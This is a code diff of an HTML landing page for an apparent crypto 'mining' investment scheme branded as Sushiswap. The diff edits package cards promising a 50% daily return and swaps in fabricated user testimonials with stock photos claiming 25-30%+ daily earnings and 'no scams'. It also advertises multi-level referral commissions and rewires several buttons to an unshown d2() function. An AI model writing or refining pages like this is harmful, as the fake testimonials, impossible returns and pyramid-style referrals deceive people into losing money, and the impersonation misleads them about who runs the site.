+                                <p><span class="text-accent">Power:</span> 6309.5W</p>
+                                <p><span class="text-accent">Efficiency:</span> 51.5J/T</p>
+                                <p><span class="text-accent">VIP Level:</span> VIP9</p>
+                            </div>
+                            <div class="border-t border-gray-600 pt-4 space-y-2">
+                                <p class="text-accent font-semibold">Daily rate of return: 50%</p>
+                                <p class="text-gray-300 text-sm">Wallet Balance: $300000+</p>
+                                <p class="text-gray-300 text-sm">Daily Profit: $150000+</p>
+                            </div>
+                            <button onclick="d2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
+                                Start Mining
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="text-center mt-12">
+                    <button onclick="d2()" class="btn-primary px-10 py-4 rounded-lg text-lg font-semibold">
+                        Choose Your Mining Package
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
 
     <!-- Mining Advantages -->
     <section class="py-20 bg-secondary">
@@ -715,47 +709,11 @@
                         <p class="text-gray-300">Third level - If user generates 100 USDT daily, you get 5 USDT</p>
                     </div>
                 </div>
-                
-                <!-- Referral Testimonials -->
-                <div class="mb-12">
-                    <h3 class="text-2xl font-bold mb-8 text-center text-white">💬 Referral Success Stories</h3>
-                    <div class="grid md:grid-cols-3 gap-6">
-                        <div class="bg-secondary border border-gray-700 p-6 rounded-lg">
-                            <div class="flex items-center mb-4">
-                                <img src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=60&h=60&fit=crop&crop=face" alt="User" class="w-12 h-12 rounded-full mr-3">
-                                <div>
-                                    <h4 class="text-white font-semibold">Mark Anderson</h4>
-                                    <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
-                                </div>
-                            </div>
-                            <p class="text-gray-300">"Built a team of 50 people! Earning $2000+ daily from referrals alone. The multi-level system is incredible!"</p>
-                        </div>
-                        <div class="bg-secondary border border-gray-700 p-6 rounded-lg">
-                            <div class="flex items-center mb-4">
-                                <img src="img/3.jpg" alt="User" class="w-12 h-12 rounded-full mr-3">
-                                <div>
-                                    <h4 class="text-white font-semibold">Jennifer Lee</h4>
-                                    <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
-                                </div>
-                            </div>
-                            <p class="text-gray-300">"My referrals are making money and so am I! Made $800 this week just from my network. Everyone wins!"</p>
-                        </div>
-                        <div class="bg-secondary border border-gray-700 p-6 rounded-lg">
-                            <div class="flex items-center mb-4">
-                                <img src="https://images.unsplash.com/photo-1507591064344-4c6ce005b128?w=60&h=60&fit=crop&crop=face" alt="User" class="w-12 h-12 rounded-full mr-3">
-                                <div>
-                                    <h4 class="text-white font-semibold">Robert Kim</h4>
-                                    <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
-                                </div>
-                            </div>
-                            <p class="text-gray-300">"Started sharing 2 weeks ago. Already have 20 active referrals earning me $300 daily. Passive income dreams come true!"</p>
-                        </div>
-                    </div>
-                </div>
+                 
 
                 <div class="text-center bg-accent text-primary p-8 rounded-lg">
                     <h3 class="text-2xl font-bold mb-4">Daily Team Commission Total = 6,150 USDT!</h3>
-                    <button onclick="k2()" class="bg-primary text-white px-8 py-3 rounded-lg text-lg font-semibold">
+                    <button onclick="d2()" class="bg-primary text-white px-8 py-3 rounded-lg text-lg font-semibold">
                         Invest Your Future
                     </button>
                 </div>
@@ -763,6 +721,75 @@
         </div>
     </section>
 
+    <!-- User Testimonials -->
+    <section class="py-20 bg-secondary">
+        <div class="container mx-auto px-6">
+            <h2 class="text-4xl font-bold mb-16 text-center text-gradient">What Our Users Say</h2>
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="bg-primary border border-gray-700 p-6 rounded-lg">
+                    <div class="flex items-center mb-4">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=60&h=60&fit=crop&crop=face" alt="User" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <h4 class="text-white font-semibold">Michael Chen</h4>
+                            <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Amazing returns! I've been earning 25% daily consistently. My wallet remains secure and I have full control."</p>
+                </div>
+                <div class="bg-primary border border-gray-700 p-6 rounded-lg">
+                    <div class="flex items-center mb-4">
+                        <img src="img/3.jpg" alt="User" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <h4 class="text-white font-semibold">Sarah Johnson</h4>
+                            <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Started with 50 USDT and now earning $15-20 daily. The platform is transparent and trustworthy!"</p>
+                </div>
+                <div class="bg-primary border border-gray-700 p-6 rounded-lg">
+                    <div class="flex items-center mb-4">
+                        <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=60&h=60&fit=crop&crop=face" alt="User" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <h4 class="text-white font-semibold">David Rodriguez</h4>
+                            <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Best mining platform ever! No deposits needed, funds stay in my MetaMask. Earning 30%+ daily!"</p>
+                </div>
+                <div class="bg-primary border border-gray-700 p-6 rounded-lg">
+                    <div class="flex items-center mb-4">
+                        <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=60&h=60&fit=crop&crop=face" alt="User" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <h4 class="text-white font-semibold">Emma Wilson</h4>
+                            <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Incredible! Made $500 in my first week. The hourly settlements are real and automatic. Highly recommend!"</p>
+                </div>
+                <div class="bg-primary border border-gray-700 p-6 rounded-lg">
+                    <div class="flex items-center mb-4">
+                        <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=60&h=60&fit=crop&crop=face" alt="User" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <h4 class="text-white font-semibold">Alex Thompson</h4>
+                            <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Finally a legitimate platform! No scams, no fake promises. Real mining, real profits. Thank you Sushiswap!"</p>
+                </div>
+                <div class="bg-primary border border-gray-700 p-6 rounded-lg">
+                    <div class="flex items-center mb-4">
+                        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=60&h=60&fit=crop&crop=face" alt="User" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <h4 class="text-white font-semibold">Lisa Park</h4>
+                            <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"The referral system is amazing! Earning from my network while they also profit. Win-win for everyone!"</p>
+                </div>
+            </div>
+        </div>
+    </section>
+	
     <!-- Why Choose Sushiswap -->
     <section class="py-20 bg-secondary">
         <div class="container mx-auto px-6">
@@ -822,7 +849,7 @@
                         </div>
                     </div>
                 </div>
-                <button onclick="k2()" class="btn-primary px-10 py-4 rounded-lg text-lg font-semibold mb-8">
+                <button onclick="d2()" class="btn-primary px-10 py-4 rounded-lg text-lg font-semibold mb-8">
                     Start Your Mining Journey
                 </button>
             </div>
@@ -838,7 +865,7 @@
                 We not only focus on returns, but more on long-term stable and secure asset growth experience. 
                 Rejecting short-term profit temptation, bringing DeFi back to its essence.
             </p>
-            <button onclick="k2()" class="btn-primary px-8 py-3 rounded-lg text-lg font-semibold">
+            <button onclick="d2()" class="btn-primary px-8 py-3 rounded-lg text-lg font-semibold">
                 Contact Us Now
             </button>
         </div>
